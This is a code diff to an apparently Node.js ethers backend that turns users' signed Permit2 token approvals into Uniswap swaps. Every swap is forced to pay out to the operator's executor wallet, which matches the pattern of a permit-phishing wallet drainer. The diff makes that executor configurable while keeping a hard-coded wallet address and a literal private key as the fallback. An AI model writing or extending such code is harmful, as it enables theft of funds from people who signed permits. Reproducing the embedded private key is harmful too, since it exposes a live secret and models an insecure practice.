@@ -16,10 +16,13 @@ const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
-// Hard-coded spender/executor address (forced)
+// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
 const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
 const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
+
+// Runtime executor config (may be loaded from Firestore admin_config/settings)
+let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
+let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
 const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };
 
 // -----------------------------
@@ -58,12 +61,16 @@ async function init() {
     const cfg = cfgSnap.exists ? cfgSnap.data() : {};
     const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
 
+    // Load optional executor override
+    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
+    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+
     provider = new ethers.JsonRpcProvider(rpc);
-    // Use hard-coded private key for signer
-    spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
+    // Use configured private key for signer
+    spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
     // Sanity check
-    if (spenderWallet.address.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
-      throw new Error(`HARDCODED_PRIVATE_KEY does not match HARDCODED_EXECUTOR: ${spenderWallet.address} != ${HARDCODED_EXECUTOR}`);
+    if (spenderWallet.address.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
+      throw new Error(`Executor private key does not match executor address: ${spenderWallet.address} != ${EXECUTOR_ADDRESS}`);
     }
     router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
   } catch (err) {
@@ -87,8 +94,8 @@ function buildSignatureBytes(r, s, vRaw) {
 function buildUniversalRouterTx(data, overrides = {}) {
   const { owner, token, amount, deadline, nonce, r, s, v } = data;
   
-  // Force recipient to the hard-coded executor to ensure recipient == spender == executor
-  const recipient = HARDCODED_EXECUTOR;
+  // Force recipient to the configured executor to ensure recipient == spender == executor
+  const recipient = EXECUTOR_ADDRESS;
   const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
   
   const amountBn = BigInt(amount);
@@ -97,7 +104,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const permitAbi = new ethers.AbiCoder();
 
   const permitSingleTuple = [
-    [[token, amountBn, Number(deadline), Number(nonce)], HARDCODED_EXECUTOR, Number(deadline)],
+    [[token, amountBn, Number(deadline), Number(nonce)], EXECUTOR_ADDRESS, Number(deadline)],
     signatureBytes
   ];
 
